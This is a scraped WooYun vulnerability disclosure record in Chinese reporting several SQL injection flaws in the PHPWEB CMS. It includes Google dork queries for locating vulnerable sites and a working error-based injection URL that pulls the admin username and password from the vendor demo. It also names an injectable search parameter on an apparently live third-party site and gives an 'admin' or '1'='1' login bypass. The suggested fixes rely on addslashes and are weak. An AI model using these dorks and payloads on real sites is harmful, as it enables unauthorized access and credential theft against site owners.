{"id": 8198, "wybug_id": "wooyun-2013-034900", "wybug_title": "PHPWEB多处SQL注入漏洞打包", "wybug_corp": "PHPWEB", "wybug_author": "只发通用型", "wybug_date": "2013-08-21 16:02", "wybug_open_date": "2013-11-19 16:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-11-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这套程序是付费的.网上找到的源码都是加密，没办法进行代码审计.黑盒测试时顺便了解了一下这个CMS的历史PHPWEB这个CMS的前身是MediSoft，后来改名为phpweb.现在又有人拿这套系统去卖.. 详细说明：  找这些网站的关键词inurl:/class/?1.htmlinurl:class/index.php?catid=0inurl:/page/html/?1.html一共三个注入点1. ?数字.htm第二和第三个要在magic_quotes_gpc=off 或者PHP5.3以上才能使用2.第一个注入，用官网的demo\nhttp://demo.8555.net/3149_4369/product/html/?78'and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x27,0x7e,user,0x27,0x7e,password,0x27,0x7e)/**/from/**/dev_base_admin/**/limit/**/0,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/*.html\n\n\n第二、第三个注入，官网demo的magic_quotes_gpc开了.没用官方demo演示，随便百度个站拼接方式太蛋疼,.木有写出POC。有兴趣的自己研究下\nhttp://www.jlczzy.com/search/index.php?imageField.x=-1138&imageField.y=-319&key=1%27\n\n\n第三个注入/admin.php账号密码admin' or '1'='1\n\n   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  1.在代码中加入if (get_magic_quotes_gpc() ){    $id = intval ($id);} 2.$key = addslashes($_GET['key']);3.$_POST['user'] = addslashes($_POST['user']);$_POST['passwrod'] = addslashes($_POST['passwrod']);   版权声明：转载请注明来源 只发通用型@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-08-21 19:37 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @只发通用型 加油    \n     2013-11-15 01:53 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  支持    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}